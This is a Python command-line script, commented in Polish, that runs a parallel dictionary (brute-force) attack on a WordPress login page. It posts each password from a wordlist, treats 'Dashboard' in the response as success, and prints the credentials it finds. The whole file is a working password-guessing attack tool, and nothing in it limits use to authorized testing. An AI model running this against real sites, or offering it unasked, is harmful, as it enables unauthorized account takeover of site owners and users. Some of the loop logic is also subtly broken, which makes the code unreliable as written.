# =========================
# 1. Importy i struktura danych
# =========================

# Importujemy biblioteki do obsługi żądań HTTP, CLI, równoległości oraz struktur danych
import requests  # Wysyłanie żądań HTTP (GET/POST)
import click      # Tworzenie interfejsu wiersza poleceń
from multiprocessing import Pool  # Obsługa wielu procesów równolegle
from dataclasses import dataclass  # Ułatwione tworzenie klas danych

# Tworzymy prostą strukturę wynikową dla pojedynczej próby logowania
@dataclass
class RequestResult:
    user: str            # Login użytkownika
    password: str        # Hasło użyte do logowania
    is_success: bool     # Czy logowanie się powiodło (True/False)

# =========================
# 2. Jedna próba logowania
# =========================

# Funkcja próbująca zalogować się do WordPressa z danym loginem i hasłem
def execute_one(address, user, password):
    # Dane przesyłane w formularzu logowania
    data = {
        'log': user,
        'pwd': password,
        'wp-submit': 'Log In',
        'testcookie': '1'
    }
    session = requests.Session()  # Utworzenie sesji HTTP
    try:
        session.get(address)  # Wysłanie zapytania GET (np. po ciasteczka)
        response = session.post(address, data=data)  # Próba logowania POST
        print(".", end="", flush=True)  # Pokazuje postęp w terminalu
        if response.status_code == 200:
            if "Dashboard" in response.text:  # Szukamy znaku sukcesu logowania
                return RequestResult(user, password, True)
        return RequestResult(user, password, False)
    except requests.RequestException as e:
        print(f"An error occurred: {e}")
        return RequestResult(user, password, False)

# =========================
# 3. Atak słownikowy z wieloma procesami
# =========================

# Funkcja główna ataku brute-force (słownikowego)
def bruteforce(address, user, password_file, jobs, keep_going):
    count = 0          # Liczba wszystkich haseł
    current = 0        # Postęp
    result = []        # Lista pozytywnych wyników

    def is_success(result: RequestResult):
        return result.is_success  # Pomocnicza funkcja filtrująca sukcesy

    # Liczymy liczbę haseł w pliku
    with open(password_file, 'r') as pf:
        for count, line in enumerate(pf):
            pass

    # Otwieramy ponownie plik i rozpoczynamy brute force
    with open(password_file, 'r') as pf:
        print(f"Total passwords: {count + 1}")
        while True:
            # Pobieramy kolejną porcję haseł do przetestowania
            passwords = [next(pf) for _ in range(jobs)]
            current += len(passwords)
            if not passwords:
                break
            try:
                with Pool(jobs) as p:  # Tworzymy pulę równoległych procesów
                    try:
                        # Próbujemy logować się równolegle dla każdej kombinacji
                        results = p.starmap(execute_one, [(address, user, password.strip()) for password in passwords])
                    except Exception as e:
                        print(e)
                    except KeyboardInterrupt:
                        print("Keyboard interrupt. Exiting...")
                        p.close()
                        p.terminate()
                        p.join()
                        return result

                    # Jeśli przynajmniej jedna próba się powiodła
                    if not any(results):
                        pass
                    else:
                        found = list(filter(is_success, results))
                        if len(found) > 0:
                            result.extend(found)
                            if not keep_going:
                                return result
                print()
            except Exception as e:
                print(e)
                p.close()
                p.terminate()
                p.join()
                return []
            # Informacja o postępie testowania
            print(f"Progress: {current}/{count + 1}")
        return result

# =========================
# 4. Interfejs wiersza poleceń (CLI)
# =========================

# Definicja interfejsu CLI z wykorzystaniem Click
@click.command()
@click.option('--address', help='Login url e.g. http://example.com/wp-login.php', metavar="ADDRESS", required=True)
@click.option('--user', help='Login username', metavar="NAME", required=True)
@click.option('-j', '--jobs', help='Jobs count', metavar="JOBS", default=4)
@click.option('--keep-going', help='Keep going after password is found', is_flag=True, show_default=True, default=False)
@click.argument('file')
def cli(address, user, jobs, file, keep_going):
    """Brute force a WordPress login.
    FILE is the path to the passwords file.
    """
    # Uruchamiamy atak i wypisujemy skuteczne logowania
    res = bruteforce(address, user, file, jobs, keep_going)
    if len(res) > 0:
        print("Brute force attack completed. Valid credentials found:")
        for r in res:
            print(f"Username: '{r.user}'")
            print(f"Password: '{r.password}'")
            print()

# =========================
# 5. Uruchomienie programu
# =========================

# Funkcja główna uruchamiająca CLI

def main():
    try:
        cli()
    except Exception as e:
        print(e)

# Sprawdzenie, czy plik uruchomiono bezpośrednio (nie importowany)
if __name__ == "__main__":
    main()
